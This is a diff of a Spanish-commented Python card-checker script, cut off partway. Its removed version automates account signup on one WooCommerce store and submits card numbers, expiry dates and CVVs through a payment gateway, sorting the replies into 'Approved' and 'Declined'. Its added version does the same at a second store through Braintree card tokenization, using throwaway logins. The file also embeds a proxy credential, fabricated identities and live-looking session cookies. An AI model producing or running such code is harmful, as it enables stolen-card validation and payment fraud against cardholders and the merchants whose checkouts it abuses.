@@ -1,216 +1,273 @@
-import base64
 import random
-import uuid
-import datetime
-from bs4 import BeautifulSoup
+import re
 import names
-from faker import Faker
-from fake_useragent import UserAgent
 from requests import Session
 from dataclasses import dataclass
-import time
-from selenium.webdriver.common.by import By
+import uuid
+import base64
 import requests
-import time
-import requests
+import json
+import names
 from bs4 import BeautifulSoup
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from bypass import obtener_driver_autorizado
+import uuid
+from fake_useragent import UserAgent
 
-def generate_usa_address():
-	fake = Faker('en_US')
-	try:
-		first_name = fake.first_name()
-		last_name = fake.last_name()
-		return {
-			"firstname": first_name,
-			"lastname": last_name,
-			"email": f"{first_name.lower()}{last_name.lower()}{fake.random_number(digits=3)}@{fake.free_email_domain()}",
-			"street": (f"{random.randint(1000, 9999)} {random.choice(['nw', 'sw', 'ne', 'se'])} {random.randint(1, 100)}th {random.choice(['st', 'ave', 'blvd', 'rd'])}"),
-			"city": fake.city(),
-			"state": fake.state_abbr(),
-			"postcode": str(random.randint(33100, 33199)),
-			"telephone": fake.numerify('305#######'),
-			"date": (datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%dT%H:%M:%S.') + f'{int((datetime.datetime.now(datetime.UTC).microsecond) / 1000):03d}Z')
-
-		}
-	except KeyError:
-		return generate_usa_address()
-
-
-class ConfigsPAge:
+class Autocomplet:
     @classmethod
-    
-    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):
+    def SessionId(self):
+        self.id = str(uuid.uuid4())
+        return self.id
+    def cut_str(self, data:str=None, chainOne:str=None, chainTwo:str=None):
 
         try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
         except ValueError: return None 
 
-    def Ccs(self, cards:str=None):
-        if '|' in cards: 
-            return cards.split('|')
-        elif ':' in cards: 
-            return cards.split(':')
-        elif ',' in cards: 
-            return cards.split(',')
-        elif '-' in cards: return cards.split('-')
+    def DecodeBear(self, dato:str = None):
+        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
+        self.bear_end = Autocomplet().cut_str(self._tokenEncoding, '"authorizationFingerprint":"', '","')
 
-        return cards
-
-
-    @classmethod
-    def RandomName(self, dato: str = None):
-        if dato == 'email':
-            self.email = "{}{}{}@gmail.com".format(
-                names.get_first_name(),
-                names.get_last_name(),
-                random.randint(1000000, 9999999)
-            )
-            return self.email
-        
-        else:
-            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'
-
-    def SaveResponseHtml(self, response: str):
-        try:
-            with open("ResponseHtml.html", "w", encoding="utf-8") as f:
-                f.write(response)
-        except Exception as e:
-            print(f"Error guardando el archivo: {e}")
-
-# Proxy
-proxy_url = 'http://oplljqes-rotate:1c4zw3p5n0yv@p.webshare.io:80'
-
+        return self.bear_end
+def parseX(data, first, last):
+    try:
+        return re.search(f'{first}(.*?){last}', data).group(1)
+    except:
+        return None 
 @dataclass
-class b3:
-    def main(self, card):
+class b35:
+    def __init__(self, tarjeta):
+
+            partes = tarjeta.split("|")
+        
+            self.tarjeta = tarjeta
+            if len(partes) == 4:
+                self.cc = partes[0]
+                self.mes = partes[1]
+                self.ano = partes[2]
+                self.cvv = partes[3]
+
+    def main(self):
         try:
-            self.Nombre = ConfigsPAge().RandomName('username')
-            self.UseMail = ConfigsPAge().RandomName('email')
-            firstname, lastname, email, phone, street, postcode, date = (generate_usa_address().get(k, '') for k in ['firstname', 'lastname', 'email', 'telephone', 'street', 'postcode', 'date'])
-            self.ua = UserAgent().random
-            self.ccs = card.split('|')
+            match random.randint(1, 5):
+                case 1:
+                    email = "ledeni6383@luckfeed.com"
+                case 2:
+                    email = "totajid239@luckfeed.com"
+                case 3:
+                    email = "jiwoxes871@luckfeed.com"
+                case 4:
+                    email = "wexik14403@luckfeed.com"
+                case 5:
+                    email = "fihatax235@luckfeed.com"
+            session = Session()
+            def generar_correo():
+                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
+            CorreoRand = generar_correo()
 
-            if self.ccs[0].startswith("4"): self.brand = "VI"
-            if self.ccs[0].startswith("3"): self.brand = "AE"
-            elif self.ccs[0].startswith("5"): self.brand = "MC"
-            # =====================================================================
-            # 1. EL NAVEGADOR HACE EL REGISTRO (PARA INICIAR SESIÓN REAL)
-            # =====================================================================
-            url_inicio = "https://store.graniteind.com/my-account/"
-            driver = obtener_driver_autorizado(url_inicio)
-
-            try:
-                wait = WebDriverWait(driver, 15)
-                
-                print("Escribiendo correo en el navegador...")
-                # Buscamos el campo de registro en el navegador
-                email_input = wait.until(EC.visibility_of_element_located((By.ID, "reg_email")))
-                
-                # Generamos un correo dinámico para evitar errores de "cuenta existente"
-                correo_aleatorio = f"brayan_test_{int(time.time())}@gmail.com"
-                email_input.clear()
-                email_input.send_keys(correo_aleatorio)
-                
-                print(f"Registrando cuenta: {correo_aleatorio}")
-                # Hacemos clic en el botón de registrar desde el navegador
-                btn_registrar = driver.find_element(By.NAME, "register")
-                btn_registrar.click()
-                
-                # Esperamos a que la página recargue y estemos dentro de la cuenta (dashboard)
-                print("Esperando inicio de sesión activo...")
-                wait.until(EC.url_contains("/my-account/"))
-                print("¡Sesión iniciada con éxito en el navegador!")
-
-                # =====================================================================
-                # 2. CAPTURAR COOKIES DE LA SESIÓN YA LOGUEADA
-                # =====================================================================
-                cookies_navegador = driver.get_cookies()
-                user_agent_autorizado = driver.execute_script("return navigator.userAgent;")
-
-            finally:
-                # Cerramos el navegador de inmediato. Ya estamos logueados y tenemos las cookies.
-                print("Cerrando navegador...")
-                driver.quit()
-
-            # =====================================================================
-            # 3. TRASPASAR TODO A REQUESTS Y CONTINUAR TU CÓDIGO NORMAL
-            # =====================================================================
-            session = requests.Session()
-            session.headers.update({'user-agent': user_agent_autorizado})
-
-            for cookie in cookies_navegador:
-                session.cookies.set(
-                    cookie['name'], 
-                    cookie['value'], 
-                    domain=cookie.get('domain', 'store.graniteind.com')
-                )
-
-            print("¡Sesión de requests sincronizada y LOGUEADA!")
-
-            # --- Petición 3 (Tu Petición Base): Obtener Nonce de Método de Pago ---
-            headers_get_payment = {
+            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
+            Agent = UserAgent().random
+            headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'es-419,es;q=0.9',
-                'referer': 'https://store.graniteind.com/my-account/',
+                'accept-language': 'es-ES,es;q=0.6',
+                'cache-control': 'max-age=0',
+                'priority': 'u=0, i',
+                'referer': 'https://rchtolive.com/my-account/',
+                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
                 'upgrade-insecure-requests': '1',
-                'user-agent': user_agent_autorizado, 
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; sbjs_session=pgs%3D41%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2F',
             }
 
-            # Hacemos la petición directamente a la zona de pagos
-            r3 = session.get('https://store.graniteind.com/my-account/add-payment-method/', headers=headers_get_payment)
+            response = session.get('https://rchtolive.com/my-account/', headers=headers)
+            login = parseX(response.text, 'name="woocommerce-login-nonce" value="', '"')
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'es-ES,es;q=0.6',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://rchtolive.com',
+                'priority': 'u=0, i',
+                'referer': 'https://rchtolive.com/my-account/',
+                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; sbjs_session=pgs%3D45%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2F',
+            }
 
-            payment_nonce = ConfigsPAge().QueryText(r3.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
-            print(f"Payment Nonce: {payment_nonce}")
+            data = {
+                'username': email,
+                'password': 'leito132asd',
+                'woocommerce-login-nonce': login,
+                '_wp_http_referer': '/my-account/',
+                'login': 'Log in',
+            }
 
-            # =====================================================================
-            # DE AQUÍ EN ADELANTE TU CÓDIGO SIGUE EXACTAMENTE IGUAL (r4, r5, r6...)
-            # =====================================================================
-            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','priority': 'u=1, i','referer': 'https://store.graniteind.com/my-account/add-payment-method/','user-agent': user_agent_autorizado,}
-            params = {'wc-api': 'WC_APS_Gateway','apsFormValuesJson': '{"billing_first_name":"Brayan","billing_last_name":"Cervantes","billing_company":"","billing_country":"Estados Unidos","billing_address_1":"444 Alaska Avenue","billing_address_2":"Suite #CJP293","billing_city":"Torrance","billing_state":"California","billing_postcode":"90503","ship_to_different_address":false}',}
-            r4 = session.get('https://store.graniteind.com/', params=params, headers=headers)
-            token = ConfigsPAge().QueryText(r4.text,'','&')
-            print(token)
+            response = session.post('https://rchtolive.com/my-account/', headers=headers, data=data)
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'es-ES,es;q=0.6',
+                'priority': 'u=0, i',
+                'referer': 'https://rchtolive.com/my-account/payment-methods/',
+                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; wordpress_logged_in_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ca149bf61b7204b046a7063e3812d38161557f57a60fb4f22b1ed2c9566b8441f; sbjs_session=pgs%3D47%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2Fpayment-methods%2F',
+            }
 
-            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://store.graniteind.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
-            params = {'tokenId': token,'amount': '0.00','topMargin': '80','': '',}
-            r5 = session.get('https://portal.apsclicktopay.com/EasyPay/JsPayStep2', params=params, headers=headers)
+            response = session.get('https://rchtolive.com/my-account/add-payment-method/', headers=headers).text
+            addpayment = parseX(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
+            clientnonce = parseX(response, '"client_token_nonce":"','",')
 
-            mm = self.ccs[1].zfill(2)
-            yy = self.ccs[2][-2:]
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'es-ES,es;q=0.6',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://rchtolive.com',
+                'priority': 'u=1, i',
+                'referer': 'https://rchtolive.com/my-account/add-payment-method/',
+                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+                'x-requested-with': 'XMLHttpRequest',
+                # 'cookie': 'wordpress_sec_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ce22466f6092c3367cdb760a97a8a0c7fdc2f2f4842e414ff3012d655d66c9a2f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; wordpress_logged_in_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ca149bf61b7204b046a7063e3812d38161557f57a60fb4f22b1ed2c9566b8441f; sbjs_session=pgs%3D48%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2Fadd-payment-method%2F',
+            }
 
-            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://portal.apsclicktopay.com','priority': 'u=0, i','referer': 'https://portal.apsclicktopay.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
-            data = {'billing-cc-number': self.ccs[0].replace(' ', ''),'billing-cc-exp': f'{self.ccs[1]}/{self.ccs[2]}','billing-cvv': self.ccs[3],}
-            r6 = session.post(f'https://gateway.repay.com/api/v2/three-step/{token}', headers=headers, data=data)
+            data = {
+                'action': 'wc_braintree_credit_card_get_client_token',
+                'nonce': clientnonce,
+            }
 
-            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://portal.apsclicktopay.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
-            params = {'token-id': token,}
-            r7 = session.get('https://portal.apsclicktopay.com/EasyPay/JsRedirectReceiver', params=params, headers=headers)
+            response = session.post('https://rchtolive.com/wp-admin/admin-ajax.php', headers=headers, data=data).json()
+            eyj2 = response['data']
+            decode = base64.b64decode(eyj2)
+            decode_string = decode.decode("utf-8")
 
-            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://store.graniteind.com','priority': 'u=0, i','referer': 'https://store.graniteind.com/my-account/add-payment-method/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
-            data = {'payment_method': 'aps','billing_first_name': 'Brayan','billing_last_name': 'Cervantes','billing_company': '','billing_country': 'Estados Unidos','billing_address_1': '444 Alaska Avenue','billing_address_2': 'Suite #CJP293','billing_city': 'Torrance','billing_state': 'California','billing_postcode': '90503','apsSavedVaultIdentifier': '','isEnableValidateCvv': '1','validateCvvTheme': 'repay_only_cvv','successMessageAfterValidatingCvv': 'CVV has been successfully validated.','apsTokenId': '','apsTokenIdB': token,'apsFormValuesJson': '{"billing_first_name":"Brayan","billing_last_name":"Cervantes","billing_company":"","billing_country":"Estados Unidos","billing_address_1":"444 Alaska Avenue","billing_address_2":"Suite #CJP293","billing_city":"Torrance","billing_state":"California","billing_postcode":"90503","ship_to_different_address":false}','isCheckout': '','woocommerce-add-payment-method-nonce': payment_nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1',}
-            r8 = session.post('https://store.graniteind.com/my-account/add-payment-method/',headers=headers, data=data,)
-            session.close()
-            soup = BeautifulSoup(r8.text, 'html.parser')
-            error_ul = soup.find('ul', class_='woocommerce-error', role='alert')
+            json_data = json.loads(decode_string)   
 
-            if error_ul:
-                first_li = error_ul.find('li')
-                if first_li and first_li.text.strip():
-                    error_message = first_li.text.strip()
+            bearer = json_data.get('authorizationFingerprint')
 
-                    if 'Payment method successfully added.' in error_message:
-                        return 'Approved! ✅', 'Charged $0.01' 
-                    if 'CVV2 Mismatch' in error_message:
-                        return 'Approved! ✅', 'CVV2 Mismatch'
-                    if 'Invalid CVV' in error_message:
-                        return 'Approved! ✅', 'Invalid CVV'
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'es-ES,es;q=0.6',
+                'authorization': f'Bearer {bearer}',
+                'braintree-version': '2018-05-10',
+                'content-type': 'application/json',
+                'origin': 'https://assets.braintreegateway.com',
+                'priority': 'u=1, i',
+                'referer': 'https://assets.braintreegateway.com/',
+                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'cross-site',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+            }
 
-                    return 'Declined! ❌', error_message
+            json_data = {
+                'clientSdkMetadata': {
+                    'source': 'client',
+                    'integration': 'custom',
+                    'sessionId': str(uuid.uuid4()),
+                },
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
+                'variables': {
+                    'input': {
+                        'creditCard': {
+                            'number': self.cc,
+                            'expirationMonth': self.mes,
+                            'expirationYear': self.ano,
+                            'cvv': self.cvv,
+                        },
+                        'options': {
+                            'validate': False,
+                        },
+                    },
+                },
+                'operationName': 'TokenizeCreditCard',
+            }
 
-            return 'Declined! ❌', 'No such issuer'
-        except: return 'Declined! ❌','Declined - No such issuer'
-        
-               
+            response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
+            token = response['data']['tokenizeCreditCard']['token']
+
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'es-ES,es;q=0.6',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://rchtolive.com',
+                'priority': 'u=0, i',
+                'referer': 'https://rchtolive.com/my-account/add-payment-method/',
+                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
